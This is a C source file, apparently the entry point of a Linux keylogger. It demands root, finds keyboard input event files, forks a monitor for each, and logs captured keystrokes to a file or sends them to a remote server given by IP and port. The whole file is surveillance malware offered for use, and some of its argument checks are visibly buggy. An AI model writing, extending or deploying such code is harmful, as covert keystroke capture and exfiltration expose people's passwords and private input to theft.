#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include "client.h"
#include "input_dev_utils.h"
#include "event_monitor.h"

#define ISSET(flags, flag) (((flags) & (flag)) == (flag))
#define PRINT_USAGE_EXIT() ({  \
        print_usage(argv[0]);  \
        exit(0);               \
})

void print_usage(char *argv0) {
    printf(
            "Usage: %s [-fn] [-t target] [-p port]\n"
            "   -f        - log to a file\n"
            "   -n        - log to a remote server\n"
            "   -t target - remote server IP address (if using -n switch) or log file path (if using -f switch).\n"
            "   -p port   - remote server listening port (only has effect when used with -n).\n",
            argv0);
}

int main(int argc, char **argv) {
    char **filenames;
    int flag = 0;
    char target[512];
    int port;

    char c;
    while ((c = getopt(argc, argv, "fnt:p:")) != -1) {
        switch (c) {
            case 'f':
                flag |= FILE_LOG;
                break;
            case 'n':
                flag |= NETWORK_LOG;
                break;
            case 't':
                strncpy(target, optarg, 512);
                break;
            case 'p':
                if (sscanf(optarg, "%i", &port) != 1 || port < 1 || port > 65535) {
                    fprintf(stderr, "Invalid port.\n");
                    exit(0);
                }
                break;
            default:
                fprintf(stderr, "Invalid option.\n");
                exit(0);
        }
    }

    if(geteuid() != 0){
        fprintf(stderr, "You must run this program as root.\n");
        PRINT_USAGE_EXIT();
    }

    if(flag == 0){
        fprintf(stderr, "You must specify -f or -n.\n");
        PRINT_USAGE_EXIT();
    }

    if(ISSET(flag, NETWORK_LOG) && ISSET(flag, FILE_LOG)){
        fprintf(stderr, "You can't use both -f and -n.\n");
        PRINT_USAGE_EXIT();
    }

    if(ISSET(flag, NETWORK_LOG) && (strlen(target) == 0 || port == 0)){
        fprintf(stderr, "You must specify target (address) and port.\n");
        PRINT_USAGE_EXIT();
    }

    if (ISSET(flag, NETWORK_LOG) && strlen(target) == 0){
        fprintf(stderr, "You must specify target (log file path).\n");
        PRINT_USAGE_EXIT();
    }

    filenames = get_keyboard_event_files();

    for (int i = 0; i < 5; ++i) {
        char *event = filenames[i];
        if (event) {
            int frk = fork();
            if (frk == 0) {
//                we're in a child
//                start monitoring the event file
                printf("Monitoring %s.\n", event);
                monitor_event(event, flag, target, port);
            }
        }
    }

    for (int i = 0; i < 5; ++i) {
        free(filenames[i]);
    }
    free(filenames);

    return 0;
}
